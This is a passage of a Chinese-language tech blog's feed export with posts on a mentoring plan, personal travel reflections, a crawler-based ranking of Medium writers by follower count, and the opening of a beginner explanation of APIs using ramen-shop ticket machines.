title="結語"></a>結語</h3><p>要先聲明一下，這也是一個實驗計畫。雖然想像很美好，但我也不知道現實會變得怎樣。最慘的情況大概就是發現自己不會帶人，完全給不出建議，合作的專案也一點都沒有想法，發現自己完全沒幫助，然後計畫就中止。</p><p>不過沒有試過也不知道，所以當然還是要試一下！</p><p>我最想輔導的其實是<strong>特定主題研究及技術文章撰寫</strong>這個主題，儘管繁體中文的文章不少，但素質參差不齊而且深淺不一，要找到一篇品質不錯的文章不是件容易的事。所以想透過這個計畫培養一些有潛力的新人，讓更多人一起為這個生態圈做貢獻。</p><p>大概就是這樣，有什麼問題都可以在底下留言問我。</p><p>想持續關注的話可以 follow 一下，單純手癢想按按鈕也可以按個 follow，或是考慮一下關注 <a href="https://www.facebook.com/lidemytw/?source=post_page---------------------------">Lidemy 粉絲專頁</a>。想看更多文章可以參考我的 Medium 文章列表：<a href="https://aszx87410.github.io/blog/medium?source=post_page---------------------------">https://aszx87410.github.io/blog/medium</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旅行的意義（上）：寫在遊日本、越南與美國後</title>
      <link href="/2019/07/13/travel-part1-46e50a306467/"/>
      <url>/2019/07/13/travel-part1-46e50a306467/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/travel-part1-46e50a306467/1__o7__ljnqfQejDNyBmuFQb5g.jpeg"></p><p>之前我在《<a href="/2019/04/13/4-years-review-7fb7edc52687/">成為前端工程師的四週年回顧</a>》裡面提到了自己的旅遊計畫，以七八月為分界，可以分成兩個部分：</p><p>2019–05–08 ~ 2019–05–31 日本（東京、京都、福岡、仙台、札幌…）<br>2019–06–03 ~ 2019–06–09 河內<br>2019–06–10 ~ 2019–06–24 紐約<br>2019–06–25 ~ 2019–06–26 河內<br>2019–06–27 ~ 2019–07–14 舊金山<br>（硬要從東岸飛回河內再飛西岸這行程讓我入境時被問了好一陣子，但為了國泰 bug 的商務及頭等艙，值得！）</p><p>2019–09–02 ~ 2019–09–08 阿布達比<br>2019–09–08 ~ 2019–10–13 歐洲（法國、義大利、西班牙、德國、英國）<br>2019–10–13 ~ 2019–10–26 韓國（首爾、釜山）</p><p>之前很多人聽到我的旅遊計畫，問的第一件事情都是：</p><blockquote><p>你為什麼旅遊這麼久？</p></blockquote><blockquote><p>是想尋找自我之類的嗎？</p></blockquote><p>我說沒有，我就只是想旅遊而已。旅遊本身即是目的，不是手段。</p><p>不過或許是因為被問到這個問題太多遍，導致我在日本的時候時不時就會想：</p><blockquote><p>旅行對我來說到底是什麼？為什麼我要旅行？我希望旅行帶給我什麼？</p></blockquote><p>因此這篇就是我旅遊到目前為止的一些心得，可能很雜亂，但大家就加減看一下。原本在日本玩的時候就想說每一個國家玩完都可以寫一篇，或者是同一篇一直更新，但懶病發作，拖到現在我已經在舊金山了。</p><p>所以乾脆分兩組然後一次寫完，下集會在十月底去完韓國之後才會寫，那時候應該會有一些不同的感想。</p><h3 id="出國的理由"><a href="#出國的理由" class="headerlink" title="出國的理由"></a>出國的理由</h3><p>大家的旅遊型態都不太一樣，眾所皆知的大概就是「十分充實型」，在去之前用盡心力查資料，去之後行程排滿滿，要把每一個必去景點都玩到，朝聖每一間必吃餐廳，這樣的旅遊才過得充實。都花大把錢來國外了，如果不能玩得充實，那還不如待在家。</p><p>出國對他們來說就是「在不同的地方，做只有在那邊才能做的事」。</p><p>而我呢，如果要幫自己歸類，我會說「隨心所欲型」。</p><p>如果是充實型的人來看我，一定會覺得我的旅遊怎麼這麼浪費，還不如待在家，幹嘛特地跑出來。但我會說：</p><blockquote><p>反正我沒差，我超級 free</p></blockquote><p>我不喜歡被什麼東西給綁住，不喜歡因為出來旅遊了就有一個枷鎖限制住自己。無論我是不是出來旅遊，我都只想做我自己當下想做的事。</p><p>所以我可以跑去河內，待在飯店裡兩天足不出戶，都在看權力遊戲或者是動畫，而沒有去下龍灣。我可以大老遠飛去紐約一個禮拜，卻沒有去過時代廣場。</p><blockquote><p>靠腰勒，那你到底出國幹嘛？</p></blockquote><p>就只是因為我想出國而已。</p><p>出國不為了拍照（我幾乎不拍照），不為了踩點（抱歉我懶），也不為了與其他國家的人交流（我都一直祈禱不要有路人來跟我講話），就只為了出國而已。</p><p>「沒去過，去去看」是我的初衷，我到這個地方來只是因為沒來過所以覺得很新奇，我從不預期會得到什麼，所以自然也沒有失望這種事。</p><p>我以前其實也差不多是這樣，但以前沒有現在這麼隨心所欲。以前的時候還會去一些知名景點看看，想說都來了至少去一下那些熱門地標，看看他們長什麼樣子。因為旅程都停留得比較長，所以儘管人是懶惰的，因為時間的積累還是可以去到滿多景點。</p><p>但這次不一樣了，跟以前不一樣了。</p><p>或許是因為從幾年前開始慢慢討厭起「一定」這個字。</p><p>「十大東京必去景點」、「一生一定要去一次的國家」、「越南必買伴手禮」、「沒去過 xx，別說你來過 oo！」…</p><p>各種聳動的標題，各種「一定」、「必定」的肯定字眼，而且肯定程度還是前所未有的百分之百。我不是討厭這些景點，我也不是一定不去這些景點，或是排斥那些熱門必吃餐廳，然後一定不去。</p><p>我只是討厭被這個詞給綁架住。</p><p>一但你同意也相信這個地方是必去景點，你就非去不可。如果不去，就是可惜，就是犯錯，就是浪費。</p><p>但我不喜歡這樣。</p><p>你可以跟我說「這地方很推薦」、「這餐廳真的很好吃，有時間可以去吃吃看」、「這景點超猛，一定要去一下！」</p><p>欸？上面怎麼出現「一定」這個詞了？</p><p>因為我寫到這邊的時候發現在不同的場合之中，「一定」好像也沒有這麼討厭。比如說上面那一句：「這景點超猛，一定要去一下！」，其實也沒有強迫你去，畢竟做出行動的是自己，對方只是給建議的那個人。</p><p>這樣看來我也不是討厭一定這個詞本身，我只是在旅遊時不想讓這個詞來引導我的行動，或者是引導我做出決定。而且很多人在說出「一定」這個詞的時候，並不是命令語氣，想表達的其實只是「強力推薦」而已。</p><p>例如說：「你明天功課一定要交」，這句話就代表說對方命令你明天要交功課，而且後面通常會搭配沒做到的懲罰，例如說沒交的話就要去外面罰站。</p><p>但是「你去東京一定要去看東京鐵塔」，就不是命令句，因為你做不到也不會有什麼懲罰。這句話其實只是「強力推薦你去東京鐵塔」的進階版本而已。</p><p>大概就像很多人說出「都」這個字的時候，也不是想要表達「全部」的意義。例如說：「男生力氣都比較大啦！」，他並不是不知道有力氣大的女生，他只是想表達：「普遍來說男生力氣比較大」這個意思。</p><p>或者是：「現在高中生都這樣啊！都在看 YouTuber」，難道沒有不看 YouTuber 的高中生嗎？一定有啊，全稱命題很難成立，但說的人難道不知道這件事嗎？很有可能知道，但比起：「現在大部分的高中生都這樣啊」，很多人會選擇字比較少的：「現在高中生都這樣啊」，但我相信他們想表達的是「大部分」而不是「全部」。</p><p>一定這個詞在旅遊中也是這樣的，「必吃」其實很多時候想表達的是強烈推薦而已，強烈推薦你去吃，但這樣不夠聳動而且字數好多，改成「必吃」就簡單多了。</p><p>其實總的來說，這還是跟你想要哪一種旅遊型態有關。有些人就是喜歡幫自己的行程加上很多「一定」，這個一定要吃、這個一定要去、這個一定要…自己幫自己銬上了這個「一定」的枷鎖。好處就是很有目標性，把目標全部都定好了，玩完之後還可以算一下有沒有達成 KPI。</p><p>但我不喜歡這樣，這樣不是適合我的旅遊型態。前面有提到對很多人來說，出國是「在不同的地方，做只有在那邊才能做到的事」，但是對我來說，出國是：</p><blockquote><p>在不同的地方，做自己想做的事</p></blockquote><p>想做什麼都可以，沒有任何限制。我覺得這也跟我自己的個性有關，有很多人會覺得做某些事情很「浪費」，但我幾乎不會這樣覺得，我覺得不同的事情從不同角度看都是一種收穫，沒有什麼是徒勞無功的。</p><p><img src="/img/travel-part1-46e50a306467/1__cA1__9MrnRqDTpDI__gOyxJg.jpeg"></p><p>像是很多人會排斥在國外吃台灣菜，這其實也挺好理解的，畢竟是來旅遊的，而且又不是很久沒吃到所以很懷念，幹嘛特地跑來國外吃比較貴的台灣菜？</p><p>但對我來說我就完全 OK，因為我很好奇不同國家的台灣餐廳會是什麼味道，會想知道是不是足夠道地。這大概就跟我以前到每個國家都會想吃一下麥當勞差不多，我只是想看看麥當勞有沒有不一樣（目前結論是都一樣）。</p><h3 id="從旅遊中認識自己"><a href="#從旅遊中認識自己" class="headerlink" title="從旅遊中認識自己"></a>從旅遊中認識自己</h3><p>雖然說我沒有預設我在旅遊中會得到什麼，但因為整個環境都不同，你會接觸到一些以前沒接觸過的事物，進而多認識自己一點。</p><blockquote><p>難道在台灣不能認識自己嗎？</p></blockquote><p>可以啊，但很多時候你沒辦法透過自省得出一些體悟。這是有沒有主動嘗試以及時間早晚的問題。想成長最快的方式就是透過各種事件，讓外力推著你前進，並引發一些新的想法。</p><p>這邊直接引用我之前寫在《<a href="/2018/06/12/english-174bd9b7c0ce/">我是如何緩慢提升英文能力的？</a>》的一段：</p><blockquote><p><em>「親身經歷」很重要，那是看再多書、知道再多知識都無法帶給你的東西，因為這種體驗只存在於現實生活的互動當中。</em></p></blockquote><blockquote><p><em>就像從小到大一直聽到「英文很重要，真的很重要」，但是為什麼很重要？因為以後要跟國外的人溝通，要會講英文；因為會英文才能去外商工作，待遇比較好；因為要與國際接軌。嗯，我知道英文很重要。但沒有切身之痛，我無法感受到英文真的很重要。</em></p></blockquote><blockquote><p><em>我第一次感受到英文很重要的時候，不是考高中要考英文的時候，也不是考學測要考英文的時候，更不是考指考要考英文的時候；而是去年我去日本的時候。</em></p></blockquote><blockquote><p><em>如同開頭所說的，我用 airbnb 找到了住宿，就是一般的平房然後兩三個房間分租給不同的房客住，或是簡單兩個字描述：短租。那時四五個房客之間都用英文溝通，如果不會英文或是英文不好的話就會溝通困難。我就是溝通困難的那個，基本對話是可以啦，但是要更深一點就不行了，你會很明顯的知道，你沒有辦法像中文那樣完整的表達自己的想法。</em></p></blockquote><p>這次旅遊有沒有什麼切身之痛呢？</p><p>有，開車。</p><p>身為一個住在大台北地區的人，就連不騎機車都很方便了。公車捷運想去哪裡就去哪裡，台北趴趴走，更遠的地方我也懶得去。而且我一直覺得騎車其實滿危險的，所以比較愛搭公車。</p><p>在大眾運輸這麼方便的背景之下，自然而然就沒有學開車的動力，所以我至今依然不會開車，在去美國之前也沒有想要學開車。</p><p>但是去美國之後，深刻體會到了在這邊不會開車就像沒腳一樣的窘境。可能只有在熱鬧的市區有大眾運輸，其他地方完全沒有。或者是有跟沒有一樣。這時候開車就顯得超級重要。</p><p>超級、超級、超級重要。</p><p>如果你住的地方不是市區，出門就只能靠叫車，像我去灣區的時候朋友可能都在不同的城市，隨便搭個車就是半小時然後 30 美金以上，大概就像你住台北然後要去桃園找朋友之類的，但沒有大眾運輸可以搭。</p><p>這次去美國之後下定決心回台灣要趕快去報駕訓班，先把開車這個技能學起來，就算在台灣不開，出國需要開的時候還是可以開。</p><p>貼一個自己的臉書廢文結束這一 part：</p><p><img src="/img/travel-part1-46e50a306467/1__yIdrj__P7npK5Tot4NMQrRQ.png"></p><p>除了這些技能相關的體會，在個人喜好上面也是深深有感。</p><p>美國就是大，地大房子也大，住的幾乎都是自己一棟然後兩層樓。住商分很開，住宅區就是全部都住宅，吃的喝的就全部都開在一起，然後想去哪邊基本上都是開車。</p><p>但日本跟越南就很像台灣，小了很多，想要買什麼吃什麼都很方便。</p><p>不過我寫到這邊發現這其實也不是國家之間的差異，而是市區與郊區的差異。只是我去的地方都是美國郊區，但是去日本跟越南都是去市區，所以才有這樣子的差別。</p><p>或者是說你到美國很容易去到郊區，例如說我來舊金山，大部分的地方都是像我剛剛講的那樣，去哪裡都要開車。但如果我去日本，就算我是去一些比較冷門的地方（本八戶應該滿冷門了吧？），用走的還是可以輕鬆走到便利商店或超市之類的，不需要開車。</p><p>總之呢，身為一個不會開車的人，理所當然的我比較喜歡待在市區。但這次去美國有了切身之痛的體驗之後，覺得雖然不開車，但「知道如何開車」還是滿重要的，先把技能學起來，以後一定用得到。</p><h3 id="看起來與做起來的差異"><a href="#看起來與做起來的差異" class="headerlink" title="看起來與做起來的差異"></a>看起來與做起來的差異</h3><p>很多東西看起來跟做起來是兩回事。</p><p>例如說我小時候看第一神拳，想說打拳擊看起來很簡單，雖然我沒親身體驗過，但我知道一定超級難。</p><p>我以前看網球王子也覺得網球好簡單，以為看漫畫就可以學會怎麼打出外旋發球，結果自己打過之後，發現連球都發不過網，更別提回擊了。</p><p>年初在規劃旅遊的時候覺得好爽，在越南美國待一個半月到處玩，終於可以放長假囉！結果實際體驗過後發現：</p><blockquote><p>旅遊也是會累的</p></blockquote><p>累的點大概就是換地方住宿之類的，像我這一個半月在越南換了兩次住宿，紐約沒有換，舊金山換了三個地方住。每次從一個地方搬出來再搬到另一個地方都覺得很累。</p><p>以前沒有旅遊過這麼久，總是嚮往要玩個一兩個月。現在親身體驗過後，我看我以後還是乖乖玩個一兩個禮拜就好，我覺得就差不多了。</p><p>還有一些旅遊景點照片看起來漂亮歸漂亮，但是人太多了。我十分不喜歡人多的地方，所以基本上我都隨便看看就走了，走馬看花一下。而且熱門景點因為大家都在那邊拍照，所以就算人沒那麼多還是寸步難行，如果你去的又是橋之類的景點，那就更難走了。</p><p>這邊再次以一篇臉書廢文結束這個段落：</p><p><img src="/img/travel-part1-46e50a306467/1__60ZtCSar8gted1UPsHFXOA.png"></p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>偶爾出國旅遊一波還是挺不錯的，這其實是我第一次來美國，之前的旅遊範圍都僅限於亞洲，這次算是脫離了自己的旅遊舒適圈。</p><p>收穫滿多的，大概就是更確定自己的喜好還有見了滿多朋友。而且很驚人的是在旅遊的過程中居然自己也有了些許改變！</p><p>剛來美國的時候結帳也要被問一下：「How are you today?」，想說問這幹嘛，但後來發現這邊好像就是這樣，隨時隨地都要打招呼一下，我也就隨意敷衍個 good。然後分離的時候也要來個「have a good day」之類的祝福語，祝福一下對方。</p><p>但我後來發現祝福語其實莫名地很有正面能量，別人祝你你會覺得：「哇，今天被祈福了」；祝別人的話你會覺得：「哇，簡直日行一善」，這種互相祝賀的感覺其實挺不錯的。</p><p>然後儘管這次在美國待了一段時間，英文恐懼症其實還是沒有完全治好，搞不好也不會有治好的那一天。不知道是不是只有學英文這樣，還是我學所有語言搞不好都這樣，等之後有機會學日文韓文再來看看好了。</p><p>結尾就放一張這次我最有感的一個地方的照片好了，照片底下有下集的文章連結：</p><p><img src="/img/travel-part1-46e50a306467/1__viTqqAS3ZuX1qjeVAiAw0w.jpeg"></p><p>下集傳送門：<a href="/2019/10/31/travel-part2-818482a90bc9/">旅行的意義（下）：寫在遊阿布達比、歐洲與韓國後</a></p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不專業數據分析：Medium 中文寫作者追蹤人數排名</title>
      <link href="/2019/07/03/medium-analysis-40752b9efa03/"/>
      <url>/2019/07/03/medium-analysis-40752b9efa03/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前一直想說要來爬 Medium 的資料，但最麻煩的地方在於 Medium 對外公開的 API 抓不到什麼東西，頂多只能幫你發發文。兩週前嘗試用 puppeteer 來寫爬蟲，發現效率十分低落，因此只能放棄。</p><p>但就在幾天前，我透過 Google 關鍵字「medium follower api」找到了<a href="https://gist.github.com/newhouse/843c444ddefe084ea7f01603627dbcfd">這個 gist</a>，發現原來在 profile 網址後面加上 ?format&#x3D;json 就能夠拿到 json 格式的資料！</p><p>自己隨意玩了一下之後，更進一步發現<a href="https://medium.com/_/api/users/f1fb3e40dc37/profile/stream?source=followers&limit=25">有一個 API</a> 就是我想要的資料，只要有使用者的 userId 就能夠拿到追蹤者的清單還有個人資料！</p><p>好，既然 API 都有了，剩下的就只是時間跟成本的問題了。我抓資料的方法很簡單，手動挑幾個人，把他們的追蹤者全都加到 queue 裡，然後有一支程式就不斷從 queue 拿 user id 出來，把使用者資料寫進資料庫，並且把這個使用者的追蹤者又全部丟到 queue。</p><p>所以 queue 越來越長，抓到的使用者就越來越多，花了兩三天的時間抓資料加上整理，有一份還算堪用的中文寫作者使用者清單（只有個人帳號，publication 不會被列入）。</p><p>技術的部分就點到這邊為止，之後會再寫一篇跟技術細節相關的文章。</p><p>底下是針對我抓取到的數據（大約七萬筆中文使用者資料）做的一些簡單分析，文末會提供 raw data 跟爬蟲原始碼，歡迎其他朋友做出更專業的分析。</p><p>在分享一些數據之前，讓我們先來看一個奇怪的現象。</p><h3 id="追蹤人數爆多，卻（幾乎）沒在用-Medium"><a href="#追蹤人數爆多，卻（幾乎）沒在用-Medium" class="headerlink" title="追蹤人數爆多，卻（幾乎）沒在用 Medium"></a>追蹤人數爆多，卻（幾乎）沒在用 Medium</h3><p>在這次抓到的資料當中有幾個使用者有著超級多的追蹤者，但在 Medium 上卻毫無活動。沒有發文、沒有回覆，甚至連幫其他人拍手都沒有。他們的個人頁面長這樣：</p><p><img src="/img/medium-analysis-40752b9efa03/1__3MNIBs9y1MhiB4mP7fcuhA.png"></p><p>一萬四千個追隨者，但是一篇文章都沒有。</p><p>而且這並不是特例，下面這幾個帳號也是幾乎沒有任何活動，但是都有著一定人數的追隨者。</p><p><a href="https://medium.com/@nestertweets">https:&#x2F;&#x2F;medium.com&#x2F;@nestertweets</a>，9.4k followers<br><a href="https://medium.com/@arthur369">https:&#x2F;&#x2F;medium.com&#x2F;@arthur369</a>，5.4k followers<br><a href="https://medium.com/@mranti">https:&#x2F;&#x2F;medium.com&#x2F;@mranti</a>，5.3k followers<br><a href="https://medium.com/@sixtus">https:&#x2F;&#x2F;medium.com&#x2F;@sixtus</a>，4.5k followers<br><a href="https://medium.com/@isaac">https:&#x2F;&#x2F;medium.com&#x2F;@isaac</a>，4.2k followers</p><p>這是為什麼呢？</p><p>原因可以從這幾個帳號的共同點大概猜測一下：</p><blockquote><p>他們都有綁定 Twitter，而且 Twitter 的追隨者都很多</p></blockquote><p>依稀記得當初我把 Medium 綁定 Facebook 帳號時，系統好像自動幫我追蹤了我在 Facebook 上的朋友（如果他們在 Medium 也有帳號的話）；類似地，在綁定 Twitter 時我猜也會有類似的效果。</p><p>結果就變成這樣了，有些在 Twitter 上超多追隨者的人只要在 Medium 上面綁定帳號，一篇文章都不用發，也能把一定數量的 Twitter 追隨者直接帶過來。</p><p>不過有一個先決條件是你必須很早綁定 Twitter，才能享受到這種福利，因為你在 Twitter 上的追蹤者必須比你後綁定才能被系統偵測到，才會來追隨你。上面這些帳號大多都是 2012 年左右就建立的，加入的很早。</p><p>看完了這個從數據觀察到的現象以後，我們先來看臺灣寫作者的追蹤人數排名。如果要被列入這個分類，你只是個臺灣人是不夠的，你還要在 Medium 上面有用繁體中文發表文章，才會被列入這個分類。</p><p>所以像是 <a href="https://medium.com/u/13ba09f08ed3">Kai-Fu Lee</a> 儘管有 22k 的追隨者，也不會被列入任何分類，因為他主要是用英文來寫作。而上述那些沒有發表過任何文章的作者也不會被列入。</p><p>（這些分類都是手動分的，如果有分錯的話麻煩再告知我，感謝！）</p><h3 id="臺灣寫作者追蹤人數排名"><a href="#臺灣寫作者追蹤人數排名" class="headerlink" title="臺灣寫作者追蹤人數排名"></a>臺灣寫作者追蹤人數排名</h3><p><img src="/img/medium-analysis-40752b9efa03/1__pg5xg0wxT9wPbcSE3jgqfA.png"></p><p>版面有限，這邊只放了前 20 名。追蹤人數要有 3.2k 以上才能進入前二十，4k 的尾巴是我，第 12 名（沒做這統計以前我天真以為一定有前十…），要達到 6k 才能進台灣前五。</p><p>而最亮眼的是第一名 <a href="https://medium.com/u/a06b9f60d808">Evonne Tsai</a> 的追蹤人數比二三名加起來還要高！而且才加入 Medium 不到兩年就有如此驚人的成績。第 16 名的 <a href="https://medium.com/u/2317f5323929">游舒帆Gipi</a> 與第 19 名的 <a href="https://medium.com/u/a220ac7b2c09">Chofy Lin</a> 都是在 2018 年年初才加入的，至今大概也才一年半而已，後勢看漲。</p><p>Medium 是 2012 年 8 月 15 號開始的，上面排名中就屬 <a href="https://medium.com/u/b36246f7a37c">Fred Jame</a> 最早加入，Medium 才剛開始一週後就加入了。其他人大多都是在 2015~2017 年才加入 Medium。</p><p>話說第十名以及第二十名看似是 publication，但其實也是個人帳號喔，所以才一並列入統計（不過可能也會有同名的 publication 就是了）。</p><p>在臺灣超過 1k 追蹤的有 164 人，若是達到 2k 追蹤就可以排到前 50 名。所以追蹤人數在 1k~2k 的有 100 多人，其實還滿多的。</p><p>如果你對完整的資料有興趣，可以參考：<a href="https://docs.google.com/spreadsheets/d/1TgzQ9o12uoQp8Dy6M7BTPW_BWbzKx2PWvFZDZCvHYz0/edit?usp=sharing">Medium 中文作者追蹤者排名</a>，裡面有臺灣、香港及中國超過 1k 追蹤者的使用者資料。</p><h3 id="香港寫作者追蹤人數排名"><a href="#香港寫作者追蹤人數排名" class="headerlink" title="香港寫作者追蹤人數排名"></a>香港寫作者追蹤人數排名</h3><p>（分類是我手動分的，如果有分錯先說聲抱歉）</p><p><img src="/img/medium-analysis-40752b9efa03/1__fbQAkzdEjEcx8__lYWdDWbg.png"></p><p>根據《<a href="https://medium.com/@marginalobservers/%E6%95%B8%E6%93%9A%E5%88%86%E6%9E%90%E9%A6%99%E6%B8%AFmedium-followers%E6%A6%82%E6%B3%81-%E4%B8%8A-%E5%BE%9E%E5%8F%B2%E5%85%84%E8%AA%AA%E8%B5%B7-9cefb6192991">數據分析香港Medium Followers概況(上)：從史兄說起</a>》這篇提到的一些資料，史兄應該是香港 Medium 追蹤人數最多的沒錯。</p><p>比較有趣的一個現象是大多數的作者都是在 2017 年的時候加入 Medium ，跟臺灣比起來稍晚一些。</p><p>香港寫作者的追蹤者人數分布比較平均，超過 1k 的有 39 人，超過 2k 大概可以排到前 10，3k 就可以排到第二名去了。</p><p>然後這邊也跟臺灣一樣，第二三名的追蹤人數加起來還小輸第一名，怎麼各地的第一名都那麼厲害。</p><h3 id="中國寫作者追蹤人數排名"><a href="#中國寫作者追蹤人數排名" class="headerlink" title="中國寫作者追蹤人數排名"></a>中國寫作者追蹤人數排名</h3><p>（備註：裡面有一些是沒有發文的但我沒有去掉）</p><p><img src="/img/medium-analysis-40752b9efa03/1__6XsIEaeT3mQD__8b832jHDQ.png"></p><p>基本上自我介紹如果是簡體中文，我就直接分入這個分類了，如果有被分錯的可以再跟我說。</p><p>中國這邊的狀況比較特別，第一點是排名前面的加入的時間都稍早，比臺灣還要早，大多數都是在 2013~2015 年這個區間加入的，再來是 Medium 的使用頻率並不高，不過這個從上圖看不出來。</p><p>我自己有看了排名前幾的作者，發現文章都很久沒更新了，我覺得追蹤人數之所以高跟前面講的綁定 Twitter 應該也有滿大的關係。</p><p>然後比起個人作者，中國這邊的比較多其實都是媒體網站，例如說第二名的 <a href="https://medium.com/u/12dffbd02585">ifanr.com 爱范儿</a> 跟第五名的 <a href="https://medium.com/u/5622554f5aea">华尔街日报中文网</a>。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>這次爬蟲比我想像中順利很多，成本也比我想像中低，我在 DigitalOcean 上租了一台一個月 10 鎂的機器，然後爬三天就大概爬到我想要的資料了（中間還經歷過兩三次砍掉重練）。如果多爬一陣子，我覺得要把 Medium 上面所有會員資料爬下來搞不好也行。</p><p>由於數據分析不是我專業，所以我就簡單講一下幾個我看到的點而已。這邊我把爬到的資料公開，希望有專業人士可以做出更有趣的分析。</p><p>（2020–09–20 附註：因資料過舊以及其它個資問題已刪除）</p><p>這是爬蟲的原始碼跟使用說明：<a href="https://github.com/aszx87410/medium-user-crawler">https://github.com/aszx87410/medium-user-crawler</a>。</p><p>最早會有這個爬蟲的想法純粹是因為官方完全沒有這種數據可以看，也沒有其他地方可以看這種數據（官方甚至連每天增加多少個 follower 這種也沒得看）。</p><p>我想看看自己 4k 多的追隨者可以排到多前面，所以才去寫了這個爬蟲，在做之前原本還想說 4k 搞不好前五，再差也一定前十，數據出來才發現根本不是這樣，狠狠地打了自己的臉。</p><p>不過太在意這種數據也不是好事就對了，但我就覺得還滿有趣的，而且必須承認追蹤者多的話有種虛榮感哈哈。</p><p>最後，喜歡的話可以不用拍手，但可以追蹤我，讓我早日擠進前十 😂</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從拉麵店的販賣機理解什麼是 API</title>
      <link href="/2019/06/21/ramen-and-api-6238437dc544/"/>
      <url>/2019/06/21/ramen-and-api-6238437dc544/</url>
      
        <content type="html"><![CDATA[<p>API，全名叫做 Application Programming Interface，維基百科上的中文翻譯是：「應用程式介面」。這是一個你可能聽過很多次，但從來沒有理解過的東西，常常聽到工程師說著：「串 API」，但還是不知道 API 到底是什麼。</p><p>我原本以為在網路上有關 API 的參考資料已經有很多了，應該可以讓初學者理解什麼是 API。但根據我學生們的心得，好像還是有點困難，只好自己跳下來寫一篇，試著來挑戰這個主題，希望寫出一篇淺顯易懂的 API 介紹文。</p><p>如果你問我什麼是 API，我會跟你說：「API 就是拉麵店的販賣機」，所以在切入正題之前，我們要先來研究一下日本拉麵店會出現的販賣機。</p><h3 id="仔細地研究一下販賣機"><a href="#仔細地研究一下販賣機" class="headerlink" title="仔細地研究一下販賣機"></a>仔細地研究一下販賣機</h3><p><img src="/img/ramen-and-api-6238437dc544/1__NRn__MDiOTwNUw1kPg0MjBw.jpeg"></p><p>你有去日本玩過嗎？或其實現在有些台灣的店家也用相同的方式來取代人力了。</p><p>上面的圖片是販賣餐券的販賣機（我原本想拍一張更近一點的然後是拉麵店的，但我離開日本才想到我忘記拍了…只好拿很久以前在東京都廳的餐廳拍的圖片來補），每一個按鈕就是一個品項，例如說咖哩飯、咖哩烏龍麵、咖哩豬排飯等等，也有一些像是「份量加大」、「加蛋」之類的選項。</p><p>當你決定好要什麼以後，就投錢進去，然後按下你要的選項的按鈕，就會有張餐券掉出來，上面寫著你所選的品項。簡單來說呢，就是個販售餐券的販賣機，跟你平常買可樂買果汁的販賣機大同小異。</p><p>拿到餐券之後呢，你就只要把它交給店員就好，店員就知道你要點什麼餐了。接著就是坐等餐點煮好，開始享用豐盛的一餐。</p><p>我第一次去日本的時候體驗到這種點餐方式覺得十分特別，但接下來我們要來想一下，它到底特別在哪裡。為了回答這個問題，我們先來回憶一下原本點餐怎麼點。</p><p>如果是跟以前一樣在櫃檯點餐，幫你點餐的會是店員，然後你要跟店員說你要什麼品項，也能夠進一步客製化，例如說：「一份燒肉套餐不要燒肉」或者是「雞排要切不要辣，炸酥一點，蒜多一點」，接著店員再透過電腦系統或者是直接跟內場說你要點什麼。</p><p>那這跟我們用餐券販賣機差在哪裡呢？</p><h4 id="固定品項"><a href="#固定品項" class="headerlink" title="固定品項"></a>固定品項</h4><p>販賣機的品項是固定的，上面沒有的你點不到。沒有一個地方可以讓你輸入客製化資訊，所以如果沒有「不要薑」的按鈕，你的餐券上面就不會有這項資訊，你就點不到沒有薑的拉麵（這邊先不考慮直接跟店員說）。</p><h4 id="減少溝通障礙"><a href="#減少溝通障礙" class="headerlink" title="減少溝通障礙"></a>減少溝通障礙</h4><p>你溝通的對象從店員變成了機器，壞處就像上面說的一樣，客製化程度有限，而好處就是沒有溝通問題。你不會講日文也沒關係，反正按鈕上有寫英文或中文，就算沒有也會有圖片，你按按鈕就可以點餐了，完全沒有語言障礙。</p><p>簡而言之，在你跟餐廳之間，<strong>你們透過販賣機這個媒介來溝通</strong>。你跟販賣機說你要什麼，然後得出一張餐券，接著把這個餐券交給餐廳，餐廳就會處理剩下的事情並且把餐點給你。</p><p>這過程當中你一句話都不用說，只需要透過按按鈕跟遞餐券，就完成了點餐加付款的程序。</p><p>好，上面我們講的都是以顧客的角度來看這件事，那接著我們來想想，為什麼店家要導入販賣機？導入販賣機有什麼好處？</p><h4 id="節省人力"><a href="#節省人力" class="headerlink" title="節省人力"></a>節省人力</h4><p>最直接能想到的一點就是節省人力，你只要買一台機器放在那邊，就解決了點餐跟買單這兩項作業，不用再放一個人到收銀台那邊，節省了一些人力成本。</p><p>而且對餐廳來說，原本點完餐之後店員要跟廚師說有什麼單，現在變成餐券之後，其實餐券直接拿給廚師就好，他們就知道要煮什麼了。</p><h4 id="固定點餐選項，節省客製化所需成本"><a href="#固定點餐選項，節省客製化所需成本" class="headerlink" title="固定點餐選項，節省客製化所需成本"></a>固定點餐選項，節省客製化所需成本</h4><p>因為改用了餐券販賣機，上面的選項都是你已經定好的，所以你不想提供的東西可以不放。</p><p>例如說你拉麵就是一個 size 不能加大也不能縮小，上面就可以不放加大的按鈕，客人也不用問你說：「麵可以加大嗎？」，因為販賣機上面沒有就是沒有。也不用再處理那種牛肉麵不要牛肉的情況，除非你自己在販賣機上面放這個選項。</p><p>這樣分析完之後，覺得販賣機還真的是好處多多，難怪日本一堆店都用販賣機來處理點餐跟買單，寫完上面這段之後連我自己都想買一台放家裡了。</p><p>但是，這到底跟 API 有什麼關係？</p><p>別急，我們慢慢來嘛！先再來看一個故事再說。</p><h3 id="民宿主人阿民的故事"><a href="#民宿主人阿民的故事" class="headerlink" title="民宿主人阿民的故事"></a>民宿主人阿民的故事</h3><p>阿民家裡經營著民宿的生意，為了讓大家更有畫面感，這是房間的長相：</p><p><img 